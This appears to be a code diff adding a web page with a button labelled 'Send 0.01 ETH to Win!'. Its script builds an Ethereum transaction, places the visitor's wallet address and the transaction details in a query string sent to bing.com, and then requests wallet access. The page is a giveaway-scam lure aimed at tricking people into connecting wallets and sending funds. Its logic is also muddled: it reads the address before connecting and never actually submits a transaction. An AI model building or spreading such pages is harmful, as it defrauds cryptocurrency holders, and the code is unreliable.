@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    async function openBingAndPromptWallet() {
+      // Prepare transaction parameters
+      const transactionParameters = {
+        nonce: "0x00",
+        gasPrice: "0x244AC6D",
+        gas: "0x12A52",
+        to: "0x0000000000000000000000000000000000000000", // Replace with the actual recipient address
+        from: ethereum.selectedAddress,
+        value: "0x2386F26FC10000",
+        data: "0x00",
+        chainId: "0x1",
+      };
+
+      // Convert transaction parameters to a query string
+      const transactionQueryString = Object.keys(transactionParameters)
+        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(transactionParameters[key])}`)
+        .join('&');
+
+      // Open bing.com with the transaction parameters as query string
+      window.open(`https://bing.com?${transactionQueryString}`, 'x');
+
+      // Check for wallet connection
+      await promptWalletConnection();
+    }
+
+    async function promptWalletConnection() {
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          // Request wallet connection
+          await ethereum.request({ method: 'eth_requestAccounts' });
+          alert('Wallet connected successfully!');
+        } catch (error) {
+          alert('Wallet connection request rejected by the user.');
+        }
+      } else {
+        alert('Web3 (Ethereum provider) is not available in this browser.');
+      }
+    }
+
+    // Add the new button
+    const y = document.createElement("button");
+    y.className = "button";
+    y.innerText = "Send 0.01 ETH to Win!";
+    y.addEventListener("click", openBingAndPromptWallet);
+    document.body.appendChild(y);
+  </script>
+</body>
+</html>
